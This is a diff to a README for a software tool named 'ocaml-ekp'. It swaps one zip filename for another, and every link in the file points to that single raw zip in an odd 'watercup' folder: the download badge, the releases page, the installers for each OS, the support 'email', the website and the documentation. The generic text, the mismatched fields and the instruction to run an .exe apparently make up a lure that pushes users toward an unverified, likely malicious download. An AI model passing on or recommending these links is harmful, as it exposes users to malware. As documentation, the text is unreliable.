@@ -6,7 +6,7 @@ Welcome to the ocaml-ekp repository! This tool helps you manage your data effici
 
 ## 📥 Download Now
 
-[![Download ocaml-ekp](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip)](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip)
+[![Download ocaml-ekp](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip)](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,21 +19,21 @@ To run ocaml-ekp, ensure your computer meets these basic requirements:
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Navigate to the [Releases page](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip) to find the latest version of the software.
+   Navigate to the [Releases page](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    You will see a list of available versions. Look for the most recent one, typically at the top of the list.
 
 3. **Download the Installer**  
    Click on the appropriate file for your operating system. For example:
-   - **For Windows**: Download `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip`
-   - **For macOS**: Download `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip`
-   - **For Linux**: Download `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip`
+   - **For Windows**: Download `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip`
+   - **For macOS**: Download `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip`
+   - **For Linux**: Download `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip`
 
 4. **Install the Software**  
    - **Windows**: Open the `.exe` file and follow the installation prompts.
    - **macOS**: Open the `.dmg` file, drag the application into your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip` file and follow the installation instructions in the README file inside the folder.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip` file and follow the installation instructions in the README file inside the folder.
 
 5. **Run ocaml-ekp**  
    After installation, locate the application on your computer and double-click to open it. 
@@ -58,14 +58,14 @@ Once you have installed ocaml-ekp, access our comprehensive user guide directly 
 
 If you need help, please check the FAQ section in the application. You can also reach out via:
 
-- **Email**: https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip
+- **Email**: https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip
 - **GitHub Issues**: Use the GitHub Issues feature to report bugs or request new features.
 
 ## 🔗 Additional Resources
 
 For further details, visit:
 
-- [Official Website](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip)
-- [Documentation](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ocaml-ekp.zip)
+- [Official Website](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip)
+- [Documentation](https://raw.githubusercontent.com/abhisheksubi/ocaml-ekp/main/watercup/ekp-ocaml-golf.zip)
 
 Thank you for choosing ocaml-ekp. We hope this tool simplifies your data management tasks!
